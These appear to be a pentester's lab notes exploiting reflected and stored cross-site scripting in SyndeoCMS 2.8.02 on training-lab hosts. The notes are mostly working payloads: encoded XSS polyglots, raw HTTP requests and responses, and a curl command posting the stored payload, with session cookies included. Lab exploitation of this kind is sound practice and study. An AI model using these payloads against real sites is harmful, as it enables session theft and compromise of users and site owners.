***** EXPLOITED WITH NON-AUTHENTICATED USER *****

VULNERABILITY :: SyndeoCMS 2.8.02 XSS / Path Disclosure / SQL Injection

Vulnerability Details:
The vulnerability exists due to failure in the "/starnet/addons/page_slideshow.php" & "/starnet/addons/tv.php" scripts to properly sanitize user-supplied input in "loc_id" variable.
User can execute arbitrary JavaScript code within the vulnerable application.
Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.


https://packetstormsecurity.com/files/99696/SyndeoCMS-2.8.02-XSS-Path-Disclosure-SQL-Injection.html

URL :: http://8q5a972y5yyt8e7f68xwwv8kz.us-east1.attackdefenselabs.com/


PAYLOAD :: 

1. /starnet/addons/page_slideshow.php?loc_id=1"></iframe><script>alert("XSS");</script>
2. /starnet/addons/tv.php?loc_id=1"></iframe><script>alert("XSS");</script>

***** REQUEST ******

#1 - ORIGINAL
GET /starnet/addons/tv.php?loc_id=1&page= HTTP/1.1
Host: 8q5a972y5yyt8e7f68xwwv8kz.us-east1.attackdefenselabs.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=s1ianeigm67jisd0rd4orn88k3
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

*************************
#2 - CUSTOMIZED
GET /starnet/addons/tv.php?loc_id="></iframe><script>alert("XSS");</script>&page=pokoyo2 HTTP/1.1
Host: 8q5a972y5yyt8e7f68xwwv8kz.us-east1.attackdefenselabs.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=s1ianeigm67jisd0rd4orn88k3
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

*************************

RESPONSE

HTTP/1.1 200 OK
Content-Length: 188
Content-Type: text/html
Date: Sun, 08 Sep 2019 17:45:42 GMT
Server: Apache/2.4.7 (Ubuntu)
Vary: Accept-Encoding
X-Powered-By: PHP/5.5.9-1ubuntu4.25
Connection: close

Error: No active script found: <iframe name="checker" src="checker.php?loc_id="></iframe><script>alert("XSS");</script>&id=0" width="0" height="0" scrolling="no" frameborder="no"></iframe>

*************************


COOKIE :: PHPSESSID=s1ianeigm67jisd0rd4orn88k3
DOMAIN :: 8q5a972y5yyt8e7f68xwwv8kz.us-east1.attackdefenselabs.com
URL :: http://8q5a972y5yyt8e7f68xwwv8kz.us-east1.attackdefenselabs.com/starnet/addons/tv.php?loc_id=%22%3E%3C/iframe%3E%3Cscript%3Ealert(document.URL);%3C/script%3E&page=pokoyo2


***** EXPLOITED WITH AUTHENTICATED USER *****

URL :: http://g3lr687s4e5ect75jinroqfwp.us-east1.attackdefenselabs.com/

INPUT :: 

- http://g3lr687s4e5ect75jinroqfwp.us-east1.attackdefenselabs.com/index.php?section=1&page=1
- http://g3lr687s4e5ect75jinroqfwp.us-east1.attackdefenselabs.com/index.php?page=9&section=6
- http://g3lr687s4e5ect75jinroqfwp.us-east1.attackdefenselabs.com/starnet/index.php?option=pagemanager&section=1&savepage=new&site=        :: VULNERABLE/EXPLOITED


CODE :: 
    <div id="footer">
      Copyright &copy; 2006 Pentester Academy | <a href="index.php?print=yes&section=pokoyo1&page=pokoyo2">Print</a> | Latest change: 01-06-2007 | Site created with <a href="http://www.syndeocms.org">SyndeoCMS</a> |
    </div>


PAYLOAD #1 ::

http://g3lr687s4e5ect75jinroqfwp.us-east1.attackdefenselabs.com/index.php?section="><script>alert()</script>&page=1


PAYLOAD #2 :: 
http://g3lr687s4e5ect75jinroqfwp.us-east1.attackdefenselabs.com/index.php?section=&#x22;&#x3E;&#x3C;script&#x3E;alert()&#x3C;/script&#x3E;&page=1

PAYLOAD #3 ::
%22%3e%3e%3cmarquee%3e%3cimg%20src%3dx%20onerror%3dconfirm(1)%3e%3c%2fmarquee%3e%22%20%3e%3c%2fplaintext%5c%3e%3c%2f%7c%5c%3e%3cplaintext%2fonmouseover%3dprompt(1)%20%3e%3cscript%3eprompt(1)%3c%2fscript%3e@gmail%2ecom%3cisindex%20formaction%3djavascript%3aalert(%2fXSS%2f)%20type%3dsubmit%3e'--%3e%22%20%3e%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3e%22%3e%3cimg%2fid%3d%22confirm%26lpar%3b%201)%22%2falt%3d%22%2f%22src%3d%22%2f%22onerror%3deval(id%26%23x29%3b%3e'%22%3e%3cimg%20src%3d%22http%3a%20%2f%2fi%2eimgur%2ecom%2fP8mL8%2ejpg%22%3e

PAYLOAD #4 *** FUNCIONAL ***
title=%22%3e%3e%3cmarquee%3e%3cimg%20src%3dx%20onerror%3dconfirm(1)%3e%3c%2fmarquee%3e%22%20%3e%3c%2fplaintext%5c%3e%3c%2f%7c%5c%3e%3cplaintext%2fonmouseover%3dprompt(1)%20%3e%3cscript%3eprompt(1)%3c%2fscript%3e@gmail%2ecom%3cisindex%20formaction%3djavascript%3aalert(%2fXSS%2f)%20type%3dsubmit%3e'--%3e%22%20%3e%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3e%22%3e%3cimg%2fid%3d%22confirm%26lpar%3b%201)%22%2falt%3d%22%2f%22src%3d%22%2f%22onerror%3deval(id%26%23x29%3b%3e'%22%3e%3cimg%20src%3d%22http%3a%20%2f%2fi%2eimgur%2ecom%2fP8mL8%2ejpg%22%3e&sort=pokoyo2&category=%22%3e%3e%3cmarquee%3e%3cimg%20src%3dx%20onerror%3dconfirm(1)%3e%3c%2fmarquee%3e%22%20%3e%3c%2fplaintext%5c%3e%3c%2f%7c%5c%3e%3cplaintext%2fonmouseover%3dprompt(1)%20%3e%3cscript%3eprompt(1)%3c%2fscript%3e@gmail%2ecom%3cisindex%20formaction%3djavascript%3aalert(%2fXSS%2f)%20type%3dsubmit%3e'--%3e%22%20%3e%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3e%22%3e%3cimg%2fid%3d%22confirm%26lpar%3b%201)%22%2falt%3d%22%2f%22src%3d%22%2f%22onerror%3deval(id%26%23x29%3b%3e'%22%3e%3cimg%20src%3d%22http%3a%20%2f%2fi%2eimgur%2ecom%2fP8mL8%2ejpg%22%3e&module=pokoyo4&savebutton=%A0%A0%A0Save


ENCODED ::

%22%3E%3Cscript%3Ealert()%3C%2Fscript%3E

&#x22;&#x3E;&#x3C;script&#x3E;alert()&#x3C;/script&#x3E;


curl -i -s -k  -X $'POST' \
    -H $'Host: g3lr687s4e5ect75jinroqfwp.us-east1.attackdefenselabs.com' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:70.0) Gecko/20100101 Firefox/70.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 1159' -H $'Origin: http://g3lr687s4e5ect75jinroqfwp.us-east1.attackdefenselabs.com' -H $'Connection: close' -H $'Referer: http://g3lr687s4e5ect75jinroqfwp.us-east1.attackdefenselabs.com/starnet/index.php?option=pagemanager&suboption=newpage&section=1&site=' -H $'Cookie: PHPSESSID=d7uhfo426d3ob86jva41l654s4' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=d7uhfo426d3ob86jva41l654s4' \
    --data-binary $'title=%22%3e%3e%3cmarquee%3e%3cimg%20src%3dx%20onerror%3dconfirm(1)%3e%3c%2fmarquee%3e%22%20%3e%3c%2fplaintext%5c%3e%3c%2f%7c%5c%3e%3cplaintext%2fonmouseover%3dprompt(1)%20%3e%3cscript%3eprompt(1)%3c%2fscript%3e@gmail%2ecom%3cisindex%20formaction%3djavascript%3aalert(%2fXSS%2f)%20type%3dsubmit%3e\'--%3e%22%20%3e%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3e%22%3e%3cimg%2fid%3d%22confirm%26lpar%3b%201)%22%2falt%3d%22%2f%22src%3d%22%2f%22onerror%3deval(id%26%23x29%3b%3e\'%22%3e%3cimg%20src%3d%22http%3a%20%2f%2fi%2eimgur%2ecom%2fP8mL8%2ejpg%22%3e&sort=pokoyo2&category=%22%3e%3e%3cmarquee%3e%3cimg%20src%3dx%20onerror%3dconfirm(1)%3e%3c%2fmarquee%3e%22%20%3e%3c%2fplaintext%5c%3e%3c%2f%7c%5c%3e%3cplaintext%2fonmouseover%3dprompt(1)%20%3e%3cscript%3eprompt(1)%3c%2fscript%3e@gmail%2ecom%3cisindex%20formaction%3djavascript%3aalert(%2fXSS%2f)%20type%3dsubmit%3e\'--%3e%22%20%3e%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3e%22%3e%3cimg%2fid%3d%22confirm%26lpar%3b%201)%22%2falt%3d%22%2f%22src%3d%22%2f%22onerror%3deval(id%26%23x29%3b%3e\'%22%3e%3cimg%20src%3d%22http%3a%20%2f%2fi%2eimgur%2ecom%2fP8mL8%2ejpg%22%3e&module=pokoyo4&savebutton=%A0%A0%A0Save' \
    $'http://g3lr687s4e5ect75jinroqfwp.us-east1.attackdefenselabs.com/starnet/index.php?option=pagemanager&section=1&savepage=new&site='





**** REQUEST VULNERABLE ****

#1 

POST /starnet/index.php?option=pagemanager&section=1&savepage=new&site= HTTP/1.1
Host: g3lr687s4e5ect75jinroqfwp.us-east1.attackdefenselabs.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 1159
Origin: http://g3lr687s4e5ect75jinroqfwp.us-east1.attackdefenselabs.com
Connection: close
Referer: http://g3lr687s4e5ect75jinroqfwp.us-east1.attackdefenselabs.com/starnet/index.php?option=pagemanager&suboption=newpage&section=1&site=
Cookie: PHPSESSID=d7uhfo426d3ob86jva41l654s4
Upgrade-Insecure-Requests: 1

title=%22%3e%3e%3cmarquee%3e%3cimg%20src%3dx%20onerror%3dconfirm(1)%3e%3c%2fmarquee%3e%22%20%3e%3c%2fplaintext%5c%3e%3c%2f%7c%5c%3e%3cplaintext%2fonmouseover%3dprompt(1)%20%3e%3cscript%3eprompt(1)%3c%2fscript%3e@gmail%2ecom%3cisindex%20formaction%3djavascript%3aalert(%2fXSS%2f)%20type%3dsubmit%3e'--%3e%22%20%3e%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3e%22%3e%3cimg%2fid%3d%22confirm%26lpar%3b%201)%22%2falt%3d%22%2f%22src%3d%22%2f%22onerror%3deval(id%26%23x29%3b%3e'%22%3e%3cimg%20src%3d%22http%3a%20%2f%2fi%2eimgur%2ecom%2fP8mL8%2ejpg%22%3e&sort=pokoyo2&category=%22%3e%3e%3cmarquee%3e%3cimg%20src%3dx%20onerror%3dconfirm(1)%3e%3c%2fmarquee%3e%22%20%3e%3c%2fplaintext%5c%3e%3c%2f%7c%5c%3e%3cplaintext%2fonmouseover%3dprompt(1)%20%3e%3cscript%3eprompt(1)%3c%2fscript%3e@gmail%2ecom%3cisindex%20formaction%3djavascript%3aalert(%2fXSS%2f)%20type%3dsubmit%3e'--%3e%22%20%3e%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3e%22%3e%3cimg%2fid%3d%22confirm%26lpar%3b%201)%22%2falt%3d%22%2f%22src%3d%22%2f%22onerror%3deval(id%26%23x29%3b%3e'%22%3e%3cimg%20src%3d%22http%3a%20%2f%2fi%2eimgur%2ecom%2fP8mL8%2ejpg%22%3e&module=pokoyo4&savebutton=%A0%A0%A0Save
################################################
#2 

POST /starnet/index.php?option=pagemanager&section=1&savepage=new&site= HTTP/1.1
Host: g3lr687s4e5ect75jinroqfwp.us-east1.attackdefenselabs.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 469
Origin: http://g3lr687s4e5ect75jinroqfwp.us-east1.attackdefenselabs.com
Connection: close
Referer: http://g3lr687s4e5ect75jinroqfwp.us-east1.attackdefenselabs.com/starnet/index.php?option=pagemanager&suboption=newpage&section=1&site=
Cookie: PHPSESSID=d7uhfo426d3ob86jva41l654s4
Upgrade-Insecure-Requests: 1

title=%2f%2a--%3e]]%3e%%3e%3f%3e%3c%2fobject%3e%3c%2fscript%3e%3c%2ftitle%3e%3c%2ftextarea%3e%3c%2fnoscript%3e%3c%2fstyle%3e%3c%2fxmp%3e'-%2f%22%2f-alert(1)%2f%2f%3e%3cimg%20src%3d1%20onerror%3dalert(1)%3e'&sort=pokoyo2&category=%2f%2a--%3e]]%3e%%3e%3f%3e%3c%2fobject%3e%3c%2fscript%3e%3c%2ftitle%3e%3c%2ftextarea%3e%3c%2fnoscript%3e%3c%2fstyle%3e%3c%2fxmp%3e'-%2f%22%2f-alert(1)%2f%2f%3e%3cimg%20src%3d1%20onerror%3dalert(1)%3e'&module=pokoyo4&savebutton=%A0%A0%A0Save
************************************************


COOKIE :: PHPSESSID=d7uhfo426d3ob86jva41l654s4

DOMAIN :: g3lr687s4e5ect75jinroqfwp.us-east1.attackdefenselabs.com


